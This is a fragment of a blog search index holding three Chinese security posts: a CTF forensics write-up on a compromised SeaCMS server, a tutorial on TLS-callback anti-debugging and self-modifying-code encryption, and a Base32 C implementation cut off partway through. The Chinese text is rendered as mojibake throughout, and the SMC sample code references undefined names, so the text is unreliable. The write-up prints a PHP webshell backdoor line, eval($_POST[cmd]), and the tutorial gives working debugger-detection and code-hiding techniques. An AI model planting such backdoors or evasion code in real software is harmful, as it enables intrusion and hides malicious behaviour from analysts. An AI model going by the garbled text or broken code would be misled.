smallorange","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://qianfei11.github.io/tags/ctf/"},{"name":"wp","slug":"wp","permalink":"https://qianfei11.github.io/tags/wp/"},{"name":"pwn","slug":"pwn","permalink":"https://qianfei11.github.io/tags/pwn/"}]},{"title":"2018-ä¿¡æ¯å®‰å…¨é“äººä¸‰é¡¹èµ›æ€»å†³èµ›-æ•°æ®èµ›-writeup","slug":"2018-ä¿¡æ¯å®‰å…¨é“äººä¸‰é¡¹èµ›æ€»å†³èµ›-æ•°æ®èµ›-writeup","date":"2018-12-08T11:44:17.000Z","updated":"2018-12-09T07:15:18.819Z","comments":true,"path":"2018/12/08/2018-ä¿¡æ¯å®‰å…¨é“äººä¸‰é¡¹èµ›æ€»å†³èµ›-æ•°æ®èµ›-writeup/","link":"","permalink":"https://qianfei11.github.io/2018/12/08/2018-ä¿¡æ¯å®‰å…¨é“äººä¸‰é¡¹èµ›æ€»å†³èµ›-æ•°æ®èµ›-writeup/","excerpt":"ç¬¬ä¸€æ¬¡å‚åŠ é“ä¸‰ï¼Œè¿™æ¬¡æ€»å†³èµ›ä¸­çš„æ•°æ®èµ›ä¸å†æ˜¯ä¹‹å‰çš„çœ‹æ•°æ®åŒ…ï¼Œè€Œæ˜¯ç›´æ¥ç»™äº†ä¸€å°webæœåŠ¡å™¨æº¯æºã€‚","text":"ç¬¬ä¸€æ¬¡å‚åŠ é“ä¸‰ï¼Œè¿™æ¬¡æ€»å†³èµ›ä¸­çš„æ•°æ®èµ›ä¸å†æ˜¯ä¹‹å‰çš„çœ‹æ•°æ®åŒ…ï¼Œè€Œæ˜¯ç›´æ¥ç»™äº†ä¸€å°webæœåŠ¡å™¨æº¯æºã€‚ ç»éªŒæ€»ç»“ç¬¬ä¸€æ¬¡æ¥è§¦ï¼Œå…¨é˜Ÿä¹Ÿå°±è‡ªå·±ä¸€ä¸ªäººåœ¨åšï¼ŒæŒ–äº†å‘ä¹Ÿå¡«äº†å‘ï¼Œè®°å½•ä¸€ä¸‹ã€‚ æœåŠ¡å™¨ç»™çš„æ˜¯å‘½ä»¤è¡Œç•Œé¢ï¼Œä¸ç”¨æƒ³ç€å˜æˆå›¾å½¢ç•Œé¢æ¥æ“ä½œã€‚å› ä¸ºæˆ‘init 5å˜æˆå›¾å½¢ç•Œé¢åå‘ç°å®Œå…¨æ²¡æ³•æ“ä½œâ€¦åæ¥ä¸ºäº†å˜å›å»æˆ‘è¯¯ä»¥ä¸ºæ˜¯init 0ï¼Œç›´æ¥æŠŠæœåŠ¡å™¨å…³äº†â€¦åæ¥åªèƒ½è®©è®©ä¸»åŠæ–¹å¸®å¿™é‡å¯ä¸€ä¸‹ï¼Œå·®ç‚¹è¢«æ‰£åˆ†â€¦ åˆšå¼€å§‹çš„æ—¶å€™æˆ‘ä¸»è¦ç›®æ ‡æ˜¯åœ¨æ¯ä¸ªç”¨æˆ·çš„å®¶ç›®å½•ä»¥åŠwebæœåŠ¡çš„æ ¹ç›®å½•ä¸‹æŸ¥çœ‹æ˜¯å¦æœ‰ä¸€äº›éšè—æ–‡ä»¶ï¼Œ\bè¿˜æ˜¯å¯ä»¥æ”¶é›†åˆ°ä¸€äº›é‡è¦ä¿¡æ¯çš„ã€‚ ç„¶ååœ¨æ•°æ®åº“çš„ç›®å½•ä¸‹ä¹Ÿå¯ä»¥å‘ç°ä¸€äº›ä¿¡æ¯ã€‚ ä¹‹åæ…¢æ…¢å‘ç°æœ€é‡è¦å…¶å®æ˜¯webæœåŠ¡ä¸‹çš„ä¸€äº›logæ–‡ä»¶ï¼Œè®°å½•äº†é»‘å®¢å¯¹æœåŠ¡å™¨æ”»å‡»çš„ä¸»è¦è¿‡ç¨‹ã€‚ åæ¥æˆ‘è¿˜å‘ç°åœ¨æ¯ä¸ªç”¨æˆ·å®¶ç›®å½•ä¸‹çš„.bash_historyä¹Ÿæ˜¯å¾ˆæœ‰ç”¨çš„ï¼Œå¯ä»¥çœ‹åˆ°é»‘å®¢ææƒåå¹²çš„äº‹æƒ…ã€‚ æŸ¥çœ‹æ–‡ä»¶çš„è¯ï¼Œå»ºè®®ç”¨less -mN filenameï¼Œå› ä¸ºçº¯å‘½ä»¤è¡Œçš„ç•Œé¢ä¸èƒ½æ»šå±ï¼Œç”¨lesså°±ä¼šæ–¹ä¾¿å¾ˆå¤šã€‚ åˆšç™»ä¸ŠæœåŠ¡å™¨å»ºè®®lastlogä¸€ä¸‹ï¼Œçœ‹çœ‹é™¤äº†rootç”¨æˆ·ä¹‹å¤–å…¶ä»–ç”¨æˆ·æœ€åä¸€æ¬¡æ˜¯ä»€ä¹ˆæ—¶å€™ç™»é™†çš„ã€‚ å…¶ä»–å‘½ä»¤çš„è¯ï¼Œå¸¸ç”¨grepè‚¯å®šæ˜¯æ²¡é”™çš„â€¦ ç„¶åæ¯”èµ›çš„æ—¶å€™ä¹Ÿæ‰¾äº†ä¸¤ç¯‡å…³äºæœåŠ¡å™¨æº¯æºçš„æ–‡ç« ï¼Œè®°å½•ä¸€ä¸‹ï¼š https://www.freebuf.com/articles/web/138867.html https://www.freebuf.com/articles/rookie/179638.html æ¯”èµ›çš„æ—¶å€™å› ä¸ºæˆ‘ä»¬é˜Ÿæ’ååœ¨åæ¥ä¸æ˜¯å¾ˆé å‰ï¼Œç„¶åæˆ‘ä¿¡æ¯çš„æ”¶é›†ä¹Ÿä¸æ˜¯å¾ˆåˆ°ä½ï¼Œç¬¬ä¸€é¢˜æ€•åšé”™ä¼šæ‰£åˆ†ï¼Œä¸‡ä¸€æˆ‘ä»¬è¿ä¸‰ç­‰å¥–éƒ½æ‹¿ä¸åˆ°äº†ï¼Œå°±æ²¡æ•¢åšã€‚æ¯”èµ›ç»“æŸåæ‰çŸ¥é“æ¯ä¸ªé˜Ÿä¼éƒ½ä¼šè·å¥–â€¦ \bæº¯æºè¿‡ç¨‹è®°å½•é¢˜ç›®å·®ä¸å¤šæ˜¯è¿™æ ·ï¼šé»‘å®¢åœ¨å†…ç½‘ä¸­æ‹¿åˆ°äº†ä¸¤å°è‚‰é¸¡ï¼Œç„¶åé€šè¿‡è¿™ä¸¤å°è‚‰é¸¡å¯¹ä¸€å°æœåŠ¡å™¨è¿›è¡Œäº†æ”»å‡»ï¼Œæˆ‘ä»¬åˆ™éœ€è¦å¯¹è¿™å°æœåŠ¡å™¨æº¯æºå–è¯åˆ†æï¼Œå¹¶ä¸”æ‰¾åˆ°é»‘å®¢ç•™ä¸‹çš„åé—¨ã€‚ åˆšæ‹¿åˆ°æœåŠ¡å™¨ï¼Œå…ˆåœ¨\båœ¨rootçš„å®¶ç›®å½•ä¸‹æŸ¥çœ‹äº†ä¸€ä¸‹éšè—æ–‡ä»¶ï¼Œæ²¡æƒ³åˆ°ä¸€ä¸‹å­å°±æœ‰æ”¶è·ï¼š åœ¨è¿™é‡Œä¸€ä¸‹å­å°±æ‹¿åˆ°äº†æ•°æ®åº“çš„è´¦å·å’Œå¯†ç ã€‚ ç„¶åå°è¯•ç™»é™†ä¸€ä¸‹æ•°æ®åº“ï¼Œå‘ç°æœ‰ä¸€ä¸ªseacmsçš„æ•°æ®åº“ï¼Œç„¶åè¿›å»ä¹‹åå‘ç°ä¸€äº›é‡è¦çš„ä¿¡æ¯ï¼š çœ‹å®Œæ•°æ®åº“ï¼Œæˆ‘å°±å»æŸ¥äº†ä¸€ä¸‹å…³äºæµ·æ´‹cmsçš„æ´ï¼š https://www.freebuf.com/vuls/150042.html https://www.jianshu.com/p/ebf156afda49 å¤§æ¦‚çŸ¥é“äº†æ˜¯åœ¨webæ ¹ç›®å½•ä¸‹çš„search.phpä¸­å­˜åœ¨æ¼æ´ï¼Œç„¶åé€šè¿‡åˆ†æé»‘å®¢å¯èƒ½ç”¨æ¥æ”»å‡»çš„è„šæœ¬ï¼Œå¤§æ¦‚çŸ¥é“äº†æ”»å‡»è¿‡ç¨‹ã€‚ æˆ‘è¿™é‡Œè¿˜æŠŠsearch.phpè®°å½•ä¸‹æ¥äº†ï¼š åœ¨webç›®å½•ä¸‹è¿˜çœ‹åˆ°äº†ä¸€ä¸ª360safeï¼Œå°±æˆªäº†å¼ å›¾ï¼š ç„¶åæˆ‘çœ‹äº†ä¸€ä¸‹æ¯ä¸ªç”¨æˆ·å®¶ç›®å½•ä¸‹çš„.bash_historyï¼Œæ­£å¸¸çš„ç”¨æˆ·simpleä»¥åŠé»‘å®¢åˆ›å»ºçš„hackeréƒ½æ²¡å•¥ï¼Œä¸»è¦æ˜¯rootçš„.bash_historyï¼š å¤§æ¦‚æ”¶é›†äº†è¿™äº›ï¼Œä¹Ÿèƒ½æ¨æ–­å‡ºé»‘å®¢æ‹¿åˆ°æƒé™åæ–°å»ºäº†ä¸€ä¸ªå«hackerçš„ç”¨æˆ·ï¼Œç„¶åé»‘å®¢çš„æ“ä½œæ˜¯ä»ä»€ä¹ˆæ—¶å€™å¼€å§‹çš„ä¹Ÿæ— æ³•åˆ¤æ–­ã€‚å†grepä¸€ä¸‹ï¼š ä¸‹ä¸€æ­¥æˆ‘å°±å¼€å§‹çœ‹æ—¥å¿—ï¼Œé€šè¿‡å¯¹.bash_historyçš„é˜…è¯»ï¼Œåˆ¤æ–­ä¸»è¦æ˜¯åœ¨/var/log/httpdä¸‹å’Œ/var/www/html/logsä¸‹çš„logæ–‡ä»¶ï¼š ç„¶åå°±å¼€å§‹å¯¹logæ–‡ä»¶ä¸€è¡Œä¸€è¡Œçœ‹ä¸‹æ¥ï¼š åŸºæœ¬çœ‹åˆ°å‡ ä¸ªipï¼š åœ¨åé¢ä¸€ç‚¹çš„æ—¶å€™ä¼šçœ‹åˆ°192.168.12.173ï¼Œé€šè¿‡GETçš„urlå¾ˆå®¹æ˜“åˆ¤æ–­å‡ºåœ¨ç”¨è„šæœ¬æ‰“ç½‘ç«™ï¼š æœ€åçœ‹åˆ°å¯ä»¥é»‘å®¢åœ¨æ”¾åé—¨eval($_POST[cmd])ï¼š å¤§æ¦‚çš„åˆ†æå°±æ˜¯è¿™æ ·ï¼Œä¸­é—´ä¹Ÿè¸©äº†å¾ˆå¤šå‘ã€‚æˆ‘æœ€åçš„åˆ¤æ–­æ˜¯ï¼š IP IDENTITY OPERATING SYSTEM 192.168.31.119 admin windows 192.168.12.129 victim windows 192.168.12.173 bot windows 192.168.12.156 bot windows 192.168.12.125 bot android 192.168.31.73 bot android æ„Ÿè§‰è‡ªå·±æ•´ä½“åˆ†æä¸‹æ¥åº”è¯¥æ–¹å‘æ˜¯æ²¡é”™çš„ï¼Œå¯èƒ½å› ä¸ºè‡ªå·±æ²¡å­¦è¿‡è®¡ç½‘ï¼Œå¯¹ä¸€äº›ç½‘ç»œçš„\båè®®å’Œè¯·æ±‚æ–¹å¼æ²¡æœ‰äº†è§£å¾ˆé€å½»ï¼Œå¯¼è‡´æ¯”èµ›çš„æ—¶å€™ç¬¬ä¸€é¢˜é—®ä¸¤å°è‚‰é¸¡çš„ipå°±åˆ¤æ–­é”™äº†ï¼Œç„¶åå°±æ²¡æ•¢åšä¸‹å»â€¦","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://qianfei11.github.io/tags/ctf/"},{"name":"wp","slug":"wp","permalink":"https://qianfei11.github.io/tags/wp/"}]},{"title":"ç»•è¿‡TLSï¼ˆThread Local Storageï¼‰å’ŒSMCï¼ˆSelf Modifying Codeï¼‰ä¿æŠ¤","slug":"ç»•è¿‡TLSï¼ˆThread Local Storageï¼‰å’ŒSMCï¼ˆSelf Modifying Codeï¼‰ä¿æŠ¤","date":"2018-12-08T04:37:41.000Z","updated":"2019-02-03T10:26:10.704Z","comments":true,"path":"2018/12/08/ç»•è¿‡TLSï¼ˆThread Local Storageï¼‰å’ŒSMCï¼ˆSelf Modifying Codeï¼‰ä¿æŠ¤/","link":"","permalink":"https://qianfei11.github.io/2018/12/08/ç»•è¿‡TLSï¼ˆThread Local Storageï¼‰å’ŒSMCï¼ˆSelf Modifying Codeï¼‰ä¿æŠ¤/","excerpt":"mainå‡½æ•°å‰æœ‰ä»€ä¹ˆï¼Ÿ","text":"mainå‡½æ•°å‰æœ‰ä»€ä¹ˆï¼Ÿ TLSä»€ä¹ˆæ˜¯TLSTLSï¼ˆThread Local Storageï¼‰å›è°ƒå‡½æ•°æ˜¯æ¯å½“åˆ›å»º/ç»ˆæ­¢è¿›ç¨‹çš„çº¿ç¨‹æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨æ‰§è¡Œçš„å‡½æ•°ã€‚åˆ›å»ºçš„ä¸»çº¿ç¨‹ä¹Ÿä¼šè‡ªåŠ¨è°ƒç”¨å›è°ƒå‡½æ•°ï¼Œä¸”å…¶è°ƒç”¨æ‰§è¡Œå…ˆäºEPï¼ˆEntry Pointï¼‰ä»£ç ã€‚åŠŸèƒ½å°±æ˜¯æŠŠPEæ–‡ä»¶çš„TEXTæ®µè¿›è¡ŒåŠ å¯†ï¼Œéšè—ä»–çš„é™æ€ä»£ç æ®µç‰¹æ€§ï¼Œåœ¨è¿è¡Œçš„æ—¶å€™æŠ¢åœ¨mainå‡½æ•°æ‰§è¡Œä¹‹å‰æŠŠä»£ç æ®µç›´æ¥åœ¨å†…å­˜é‡Œé¢è§£å¯†ï¼ˆä¸ç„¶å°±å´©æºƒäº†ï¼‰ï¼Œä»è€Œè¾¾åˆ°é™æ€ä»£ç éšè—åŠŸèƒ½ã€‚ ç¼–å†™TLS123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869#include &lt;windows.h&gt; #include&lt;stdio.h&gt;#include &lt;winnt.h&gt; #include &lt;stdlib.h&gt;#include &lt;tlhelp32.h&gt;//ä½¿ç”¨tls å›è°ƒå‡½æ•°//ä½¿ç”¨TLS çš„å®#pragma comment(linker, \"/INCLUDE:__tls_used\")void lookupprocess() &#123; PROCESSENTRY32 pe32; pe32.dwSize = sizeof(pe32); HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); // åœ¨å¿«ç…§ä¸­åŒ…å«ç³»ç»Ÿä¸­æ‰€æœ‰çš„è¿›ç¨‹ BOOL bMore = Process32First(hProcessSnap, &amp;pe32); // è·å¾—ç¬¬ä¸€ä¸ªè¿›ç¨‹çš„å¥æŸ„ while (bMore) &#123; _wcslwr_s(pe32.szExeFile, wcslen(pe32.szExeFile)+1); if (!wcscmp(pe32.szExeFile, L\"ollyice.exe\")) &#123; printf(\"///////WARNING///////\\n\"); exit(0); &#125; if (!wcscmp(pe32.szExeFile, L\"ollydbg.exe\")) &#123; printf(\"///////\\nWARNING\\n///////\\n\"); exit(0); &#125; if (!wcscmp(pe32.szExeFile, L\"peid.exe\")) &#123; printf(\"///////\\nWARNING\\n///////\\n\"); exit(0); &#125; if (!wcscmp(pe32.szExeFile, L\"ida.exe\")) &#123; printf(\"///////\\nWARNING\\n///////\\n\"); exit(0); &#125; if (!wcscmp(pe32.szExeFile, L\"idaq.exe\")) &#123; printf(\"///////\\nWARNING\\n///////\\n\"); exit(0); &#125; bMore = Process32Next(hProcessSnap, &amp;pe32); // è·å–ä¸‹ä¸€ä¸ªè¿›ç¨‹çš„å¥æŸ„ &#125; CloseHandle(hProcessSnap);&#125;void Debugger(void) &#123; int result = 0; __asm &#123; mov eax, dword ptr fs:[30h]//TEBåç§»30Hå¤„ movzx eax, byte ptr ds:[eax + 2h]//å–PEBä¸­BeingDebugï¼Œè‹¥ä¸º1åˆ™è¢«è°ƒè¯• mov result, eax &#125; if (result) &#123; printf(\"///////\\nWARNING\\n///////\\n\"); exit(0); &#125;&#125;void NTAPI tls_callback(PVOID h, DWORD reason, PVOID pv) &#123; lookupprocess(); Debugger(); MessageBox(NULL, L\"Not_Main_this_is_tls!\", L\"tls\", MB_OK); return;&#125;#pragma data_seg(\".CRT$XLB\")PIMAGE_TLS_CALLBACK p_thread_callback[] = &#123; tls_callback, 0 &#125;;#pragma data_seg()int main() &#123; MessageBox(NULL, L\"Main!\", L\"ESE\", MB_OK); return 0;&#125; è°ƒè¯•TLSæŠŠæœ‰TLSä¿æŠ¤çš„ç¨‹åºæ‹–è¿›idaåˆ†æï¼Œä¼šçœ‹åˆ°mainå‡½æ•°å…¶å®æ˜¯ç©ºçš„ï¼š 1234int __cdecl main(int argc, const char **argv, const char **envp)&#123; return 0;&#125; åœ¨startï¼ˆä¹Ÿå°±æ˜¯entry pointï¼‰å¤„ä¸‹æ–­ç‚¹è°ƒè¯•ï¼š å‘ç°ç¨‹åºä¾ç„¶æ‰§è¡Œäº†ï¼Œè¯´æ˜ç¨‹åºåœ¨entry pointä¹‹å‰è¿è¡Œäº†ã€‚ åŒæ—¶å¯ä»¥æŸ¥çœ‹entry point listï¼ˆCtrl+Eï¼‰ï¼Œå‘ç°idaä¹Ÿå·²ç»åç¼–è¯‘å‡ºäº†ä¸€ä¸ªå«åšTlsCallback_0()çš„å‡½æ•°ï¼š æŸ¥çœ‹ä¸€ä¸‹è¯¥å‡½æ•°çš„åæ±‡ç¼–ä»£ç ï¼š 12345678void __stdcall TlsCallback_0(int a1, int a2, int a3)&#123; if ( a2 == 1 ) &#123; MessageBoxA(0, Text, Caption, 0); ExitProcess(0); &#125;&#125; è¿™ä¹Ÿæ˜¯è®¸å¤šæœªçŸ¥ç¨‹åºåœ¨é€†å‘æ—¶ï¼Œæ›´å»ºè®®åœ¨è™šæ‹Ÿç¯å¢ƒä¸‹è¿è¡Œçš„åŸå› ã€‚ æ‰‹åŠ¨å»é™¤TLSTlsCallbackå‡½æ•°çš„å®šä¹‰ï¼š 1234567891011typedef VOID(NTAPI *PIMAGE_TLS_CALLBACK) ( PVOID DllHandle, // æ¨¡å—å¥æŸ„ï¼Œå³åŠ è½½åœ°å€ DWORD Reason, PVOID Reserved );å…¶ä¸­reasonæœ‰ä»¥ä¸‹å‡ ç§ï¼š(winNT.h)#define DLL_PROCESS_ATTACH 1 // è¿›ç¨‹å¯åŠ¨#define DLL_THREAD_ATTACH 2 // çº¿ç¨‹å¯åŠ¨#define DLL_THREAD_DETACH 3 // çº¿ç¨‹é€€å‡º#define DLL_PROCESS_DETACH 0 // è¿›ç¨‹é€€å‡º å¯ä»¥å‚ç…§ä¹‹å‰å†™è¿‡çš„ä¸€ç‰‡writeupï¼šhttps://qianfei11.github.io/2018/05/07/2018-ZJGSCTF-writeup/#New-driver SMCä»€ä¹ˆæ˜¯SMCSMCï¼ˆSelf Modifying Codeï¼‰æ˜¯ä¸€ç§å°†å¯æ‰§è¡Œæ–‡ä»¶ä¸­çš„ä»£ç æˆ–æ•°æ®è¿›è¡ŒåŠ å¯†ï¼Œé˜²æ­¢åˆ«äººä½¿ç”¨é€†å‘å·¥ç¨‹å·¥å…·ï¼ˆæ¯”å¦‚ä¸€äº›å¸¸è§çš„åæ±‡ç¼–å·¥å…·ï¼‰å¯¹ç¨‹åºè¿›è¡Œé™æ€åˆ†æçš„æ–¹æ³•ï¼Œåªæœ‰ç¨‹åºè¿è¡Œæ—¶æ‰å¯¹ä»£ç å’Œæ•°æ®è¿›è¡Œè§£å¯†ï¼Œä»è€Œæ­£å¸¸è¿è¡Œç¨‹åºå’Œè®¿é—®æ•°æ®ã€‚è®¡ç®—æœºç—…æ¯’é€šå¸¸ä¹Ÿä¼šé‡‡ç”¨SMCæŠ€æœ¯åŠ¨æ€ä¿®æ”¹å†…å­˜ä¸­çš„å¯æ‰§è¡Œä»£ç æ¥è¾¾åˆ°å˜å½¢æˆ–å¯¹ä»£ç åŠ å¯†çš„ç›®çš„ï¼Œä»è€Œèº²è¿‡æ€æ¯’è½¯ä»¶çš„æŸ¥æ€æˆ–è€…è¿·æƒ‘åç—…æ¯’å·¥ä½œè€…å¯¹ä»£ç è¿›è¡Œåˆ†æã€‚ç°åœ¨ï¼Œå¾ˆå¤šåŠ å¯†è½¯ä»¶ï¼ˆæˆ–è€…ç§°ä¸ºâ€œå£³â€ç¨‹åºï¼‰ä¸ºäº†é˜²æ­¢Crackerï¼ˆç ´è§£è€…ï¼‰è·Ÿè¸ªè‡ªå·±çš„ä»£ç ï¼Œä¹Ÿé‡‡ç”¨äº†åŠ¨æ€ä»£ç ä¿®æ”¹æŠ€æœ¯å¯¹è‡ªèº«ä»£ç è¿›è¡Œä¿æŠ¤ã€‚è¦ç²¾å‡†çš„å®šä½æŸä¸ªå‡½æ•°éå¸¸éº»çƒ¦ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±è¦ä»¥åŒºå—ä¸ºåŠ å¯†çš„åŸºç¡€å•ä½ã€‚ 12345void encrypt_func(char *start_addr, int len) &#123; for(int i = 0; i &lt; len; i++) &#123; *(start + i) ^= 0x88; &#125;&#125; ç¼–å†™SMCå› ä¸ºå®šä½ä¸€ä¸ªå…·ä½“çš„å‡½æ•°å¾ˆç¹çï¼Œæ‰€ä»¥æˆ‘ä»¬é€‰æ‹©ç›´æ¥å®šä½ä¸€ä¸ªèŠ‚è¡¨ã€‚æŠŠæ•æ„Ÿçš„ä»£ç æ”¾å…¥èŠ‚è¡¨ä¸­ï¼Œç„¶ååœ¨éœ€è¦çš„æ—¶å€™è¿›è¡Œè§£å¯†ï¼Œè¿™å°±æ˜¯SMCåŠ¨æ€åŠ å¯†æŠ€æœ¯çš„ç²¾é«“ã€‚å°†ä¸‹é¢è¿™è¡Œä»£ç æ”¾åœ¨å¼€å§‹ç¨‹åºçš„å¼€å§‹ï¼ˆä¹Ÿå°±æ˜¯includeä¸‹é¢ï¼‰ï¼Œä¸»è¦æ˜¯è®©textèŠ‚åŒºå¯ä»¥æ‰§è¡Œã€è¯»ã€å†™å’Œåˆ†äº«ï¼š 1#pragma comment(linker, \"/SECTION:.text,ERWS\") ä»¥ä¸‹ä»£ç å¯ä»¥ç¼–è¯‘ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶ï¼Œä½†æ˜¯æ— æ³•è¿è¡Œï¼Œå› ä¸ºck()å‡½æ•°çš„åœ°å€å·²ç»è¢«æ‰“ä¹±ã€‚è¿™æ—¶å€™å°±åˆ©ç”¨ODè¿›è¡Œä¿®æ”¹ï¼Œè½½å…¥ç”Ÿæˆçš„ç¨‹åºï¼Œå½“ç¨‹åºè¿è¡Œenccrpt_func()å‡½æ•°å®Œæˆæ—¶ï¼Œck()å°±å·²ç»å®ŒæˆåŠ å¯†ï¼Œç„¶åå°†ç¨‹åºdumpä¸‹æ¥ï¼Œè¿™æ—¶å°±å¯ä»¥è¿è¡Œã€‚è‹¥æ‹¿ä¸€å¼€å§‹çš„ç¨‹åºå»é™æ€çœ‹ï¼Œæ˜¯å®Œå…¨çœ‹ä¸æ‡‚çš„ã€‚ 1234567891011121314151617181920212223242526272829#include&lt;stdio.h&gt;#include&lt;string.h&gt;#include&lt;stdlib.h&gt;#pragma comment(linker, \"/SECTION:.text,ERWS\")void encrypt_func(char *start_addr, int len) &#123; for(int i = 0; i &lt; len; i++) &#123; //è¿™é‡Œå¯¹åœ°å€è¿›è¡Œç®€å•çš„åŠ å¯†&gt; *(start + i) ^= 0x88; &#125;&#125;//éœ€è¦ä¿æŠ¤çš„å‡½æ•°void ck() &#123; printf(\"this is a test of smc\");&#125;//åŠ å¯†æ•°æ®ç»“æŸçš„åœ°å€void end()&#123;&#125;int main() &#123; char *lp_s = 0; char *lp_e = 0; int len = 0; lp_s = (char *)ck; //è·å–éœ€è¦åŠ å¯†å‡½æ•°çš„èµ·å§‹åœ°å€ lp_e = (char *)end; //è·å–éœ€è¦åŠ å¯†å‡½æ•°çš„ç»“æŸåœ°å€ len = lp_e - lp_s; enc(lp_s, len); //smcåŠ å¯†å‡½æ•° ck();&#125; è§£å¯†SMC æ‰¾åˆ°smcçš„åŠ å¯†å‡½æ•°ï¼Œå½“è¿è¡Œå®Œæˆsmcè§£å¯†å‡½æ•°æ—¶,å°†ç¨‹åºdumpä¸‹æ¥ã€‚ smcå¯¹ç¨‹åºåŠ¨æ€å®Œå…¨æ²¡æœ‰ç”¨ï¼Œå¯ä»¥ç”¨ODæ¥è°ƒè¯•ç¨‹åºï¼Œæ‰¾åˆ°å—ä¿æŠ¤ä»£ç ã€‚ å‚è€ƒç½‘ç«™http://www.hexblog.com/?p=9http://www.voidcn.com/article/p-etaovjqz-bao.htmlhttp://www.uml.org.cn/c++/200710313.asphttps://esebanana.github.io/2018/04/08/re_10_tls_smc/http://www.voidcn.com/article/p-etaovjqz-bao.html","categories":[],"tags":[{"name":"re","slug":"re","permalink":"https://qianfei11.github.io/tags/re/"}]},{"title":"Cè¯­è¨€å®ç°Base32å’ŒBase16è§£å¯†åŠ å¯†ç®—æ³•","slug":"Cè¯­è¨€å®ç°Base32å’ŒBase16è§£å¯†åŠ å¯†ç®—æ³•","date":"2018-12-04T14:04:09.000Z","updated":"2018-12-05T08:15:28.195Z","comments":true,"path":"2018/12/04/Cè¯­è¨€å®ç°Base32å’ŒBase16è§£å¯†åŠ å¯†ç®—æ³•/","link":"","permalink":"https://qianfei11.github.io/2018/12/04/Cè¯­è¨€å®ç°Base32å’ŒBase16è§£å¯†åŠ å¯†ç®—æ³•/","excerpt":"æ‰¿æ¥ä¹‹å‰Base64çš„æ–‡ç« ï¼Œå®ç°äº†ä¸€ä¸‹Base32å’ŒBase16ï¼ŒåŸç†æ˜¯ä¸€æ ·çš„ã€‚","text":"æ‰¿æ¥ä¹‹å‰Base64çš„æ–‡ç« ï¼Œå®ç°äº†ä¸€ä¸‹Base32å’ŒBase16ï¼ŒåŸç†æ˜¯ä¸€æ ·çš„ã€‚ Base32åŠ è§£å¯†å®ç°123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131#include&lt;cstdio&gt;#include&lt;cstdlib&gt;#include&lt;cstring&gt;#define MAX 100const char *base32payload = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567=\";int find_pos(char c) &#123; for(int i = 0; i &lt; 31; i++) &#123; if(c == base32payload[i]) &#123; return i; &#125; &#125; return -1;&#125;unsigned char *base32_encode(const char *s, const int len) &#123; unsigned int sign = len % 5; unsigned int res_len = len % 5 ? ((len) / 5 + 1) * 8 : (len) / 5 * 8; unsigned int i = 0, j = 0; unsigned char *res = (unsigned char *)malloc(res_len + 1); memset(res, 0, res_len + 1); for(i = 0, j = 0; i &lt; len; i += 5, j += 8) &#123; if(i + 4 &gt;= len) &#123; res[j] = (s[i] &gt;&gt; 3) &amp; 0x1F; if(sign == 1) &#123; res[j + 1] = (s[i] &lt;&lt; 2) &amp; 0x1C; res[j + 2] = 0x20; res[j + 3] = 0x20; res[j + 4] = 0x20; res[j + 5] = 0x20; res[j + 6] = 0x20; res[j + 7] = 0x20; break; &#125; else if(sign == 2) &#123; res[j + 1] = ((s[i] &lt;&lt; 2) &amp; 0x1C) | ((s[i + 1] &gt;&gt; 3) &amp; 0x18); res[j + 2] = (s[i + 1] &gt;&gt; 1) &amp; 0x1F; res[j + 3] = (s[i + 1] &lt;&lt; 4) &amp; 0x10; res[j + 4] = 0x20; res[j + 5] = 0x20; res[j + 6] = 0x20; res[j + 7] = 0x20; break; &#125; else if(sign == 3) &#123; res[j + 1] = ((s[i] &lt;&lt; 2) &amp; 0x1C) | ((s[i + 1] &gt;&gt; 3) &amp; 0x18); res[j + 2] = (s[i + 1] &gt;&gt; 1) &amp; 0x1F; res[j + 3] = ((s[i + 1] &lt;&lt; 4) &amp; 0x10) | ((s[i + 2] &gt;&gt; 4) &amp; 0x0F); res[j + 4] = (s[i + 2] &lt;&lt; 1) &amp; 0x1E; res[j + 5] = 0x20; res[j + 6] = 0x20; res[j + 7] = 0x20; break; &#125; else if(sign == 4) &#123; res[j + 1] = ((s[i] &lt;&lt; 2) &amp; 0x1C) | ((s[i + 1] &gt;&gt; 3) &amp; 0x18); res[j + 2] = (s[i + 1] &gt;&gt; 1) &amp; 0x1F; res[j + 3] = ((s[i + 1] &lt;&lt; 4) &amp; 0x10) | ((s[i + 2] &gt;&gt; 4) &amp; 0x0F); res[j + 4] = ((s[i + 2] &lt;&lt; 1) &amp; 0x1E) | ((s[i + 3] &gt;&gt; 3) &amp; 0x10); res[j + 5] = (s[i + 3] &gt;&gt; 2) &amp; 0x1F; res[j + 6] = (s[i + 3] &lt;&lt; 3) &amp; 0x18; res[j + 7] = 0x20; break; &#125; &#125; res[j] = (s[i] &gt;&gt; 3) &amp; 0x1F; res[j + 1] = ((s[i] &lt;&lt; 2) &amp; 0x1C) | ((s[i + 1] &gt;&gt; 6) &amp; 0x03); res[j + 2] = (s[i + 1] &gt;&gt; 1) &amp; 0x1F; res[j + 3] = ((s[i + 1] &lt;&lt; 4) &amp; 0x10) | ((s[i + 2] &gt;&gt; 4) &amp; 0x0F); res[j + 4] = ((s[i + 2] &lt;&lt; 1) &amp; 0x1E) | ((s[i + 3] &gt;&gt; 3) &amp; 0x10); res[j + 5] = (s[i + 3] &gt;&gt; 2) &amp; 0x1F; res[j + 6] = ((s[i + 3] &lt;&lt; 3) &amp; 0x18) | ((s[i + 4] &gt;&gt; 5) &amp; 0x07); res[j + 7] = s[i + 4] &amp; 0x1F; &#125; for(j = 0; j &lt; res_len; j++) &#123; res[j] = base32payload[res[j]]; &#125; return res;&#125;unsigned char *base32_decode(const char *s, const int len) &#123; unsigned int res_len = len / 8 * 5; unsigned int i = 0, j = 0; unsigned char *res = (unsigned char *)malloc(res_len + 1); memset(res, 0, res_len + 1); int count = len / 8; for(i = 0; i &lt; count; i++) &#123; int s_index = i * 8; int res_index = i * 5; int buffer[8]; int sign = 0; for(j = 0; j &lt; 8; j++) &#123; buffer[j] = find_pos(s[s_index + 